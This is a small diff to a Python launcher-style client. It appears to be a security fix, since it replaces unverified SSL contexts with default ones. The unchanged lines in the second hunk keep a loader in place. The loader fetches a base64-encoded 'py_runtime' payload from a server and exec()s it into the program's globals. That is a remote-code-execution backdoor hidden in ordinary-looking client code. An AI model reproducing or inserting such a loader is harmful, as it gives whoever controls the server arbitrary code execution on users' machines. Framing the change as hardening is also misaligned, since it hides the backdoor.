@@ -58,7 +58,7 @@ def make_request(url, data=None, method='GET', *, retries=3):
         'Connection': 'close',
     }
     body = json.dumps(data).encode('utf-8') if data else None
-    ctx = ssl._create_unverified_context()
+    ctx = ssl.create_default_context()
 
     for attempt in range(retries + 1):
         req = urllib.request.Request(url, data=body, headers=headers, method=method)
@@ -262,7 +262,7 @@ def main():
     try:
         import base64
         req = urllib.request.Request(f"{server_url}?action=py_runtime", headers={'User-Agent': 'MetroLaunchClient/2.2'})
-        ctx = ssl._create_unverified_context()
+        ctx = ssl.create_default_context()
         with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
             encoded_runtime = resp.read().decode('utf-8')
             exec(base64.b64decode(encoded_runtime).decode('utf-8'), globals())
